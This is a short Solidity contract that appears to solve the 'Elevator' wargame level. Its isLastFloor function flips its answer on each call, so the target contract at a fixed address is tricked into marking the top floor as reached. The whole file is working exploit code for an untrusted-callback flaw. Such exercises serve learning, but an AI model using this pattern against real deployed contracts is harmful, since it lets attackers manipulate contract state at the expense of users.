// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IElevator {
    function goTo(uint256) external;
}

contract ElevatorHack {
    IElevator public elevator = IElevator(0xA114fA2B4F1c4300E372300D81eB12a3D27651cd);
    bool flag = true;

    function isLastFloor(uint256) public returns (bool) {
        flag = !flag;
        return flag;
    }

    function goTo() public {
        uint256 whatEverFloor = 0;
        elevator.goTo(whatEverFloor);
    }
}
